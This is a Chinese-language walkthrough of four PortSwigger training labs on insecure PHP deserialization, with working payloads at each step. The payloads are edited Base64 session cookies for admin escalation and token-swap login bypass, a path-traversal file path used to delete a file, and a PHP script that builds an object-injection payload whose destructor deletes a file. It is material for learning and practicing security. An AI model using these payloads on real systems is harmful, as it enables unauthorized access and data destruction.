# Insecure deserialization
## [Lab: Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
### 題目敘述
 This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
PHP 反序列化後修改內容
### 解答

觀察登入後的餅乾是 Base64 後的 PHP Serialize 產物，解開長這樣

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7
```

可以用這種網站來觀察 https://zh.functions-online.com/unserialize.html

```
__PHP_Incomplete_Class::__set_state(array(
   '__PHP_Incomplete_Class_Name' => 'User',
   'username' => 'wiener',
   'admin' => false,
))
```


把 `admin` 後面的 `0` 改 `1` 之後會變成

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}7

__PHP_Incomplete_Class::__set_state(array(
   '__PHP_Incomplete_Class_Name' => 'User',
   'username' => 'wiener',
   'admin' => true,
))
```

再把結果轉 Base64 後貼回去就可以進 admin ㄌ

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO303
```

## [Lab: Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
### 題目敘述
 This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
PHP 反序列化修改，從錯誤訊息中找 Access token
### 解答

直接解餅乾會拿到

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dtqyhktl2ng4i7sliuypnh07cygff4fq";}
```

如果單純替換名字的 `wiener` 以及字串長度

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"dtqyhktl2ng4i7sliuypnh07cygff4fq";}
```

送出會噴錯

```
PHP Fatal error: Uncaught Exception: (DEBUG: $access_tokens[$user->username] = v140aq1rfmrsgt9nj6br3qfmgsu3736g, $user->access_token = dtqyhktl2ng4i7sliuypnh07cygff4fq, $access_tokens = [y9ax7nixfprd3f4jv5xhdgpx94bv4f5c, v140aq1rfmrsgt9nj6br3qfmgsu3736g, dtqyhktl2ng4i7sliuypnh07cygff4fq]) Invalid access token for user administrator in /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php on line 7 
```

整理一下字串會看到

```
$access_tokens[$user->username] = v140aq1rfmrsgt9nj6br3qfmgsu3736g, 
$user->access_token = dtqyhktl2ng4i7sliuypnh07cygff4fq,
$access_tokens = [y9ax7nixfprd3f4jv5xhdgpx94bv4f5c, v140aq1rfmrsgt9nj6br3qfmgsu3736g, dtqyhktl2ng4i7sliuypnh07cygff4fq]
```

我們目前的 access token 是 `dtqyhktl2ng4i7sliuypnh07cygff4fq`

直接撿一組上面的來試用看看

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"v140aq1rfmrsgt9nj6br3qfmgsu3736g";}

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InYxNDBhcTFyZm1yc2d0OW5qNmJyM3FmbWdzdTM3MzZnIjt9
```

就過了


## [Lab: Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
### 題目敘述
 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud 
### 題目解釋
透過刪除帳號功能，會刪除序列化中指定路徑的檔案

### 解答

隨便上傳一張圖片後觀察餅乾

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zyenb6gzxu4gqnam2nowbjsw8peq0zw0";s:11:"avatar_link";s:19:"users/wiener/avatar";}7
```

修改 `avatar_link`

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zyenb6gzxu4gqnam2nowbjsw8peq0zw0";s:11:"avatar_link";s:43:"../../../../../../../home/carlos/morale.txt";}7
```

然後按下 Delete Account 就解了

## [Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
### 題目敘述
 This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋

### 解答

登入後觀察原始碼會看到

```
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```

nano 會在檔案的最後面加一個 `~`，我們也可以用這招訪問
```
view-source:https://ac961f031e8e615ac0773600003c0011.web-security-academy.net/libs/CustomTemplate.php~
```

取得原始碼

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

因為它有使用到了 `__destruct` 這個函數，也就是說，反序列化的話就會直接跑這個東西，就會做刪除檔案的動作，而餅乾裡面可以放完整的序列化資料 (PHP 物件)

所以我們可以寫一個

```php
<?php

Class CustomTemplate{
    public $lock_file_path = "/home/carlos/morale.txt";
}
$u = new CustomTemplate();

echo serialize($u);
```

然後用 `php -S 127.0.0.1:8888` 跑起來收

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

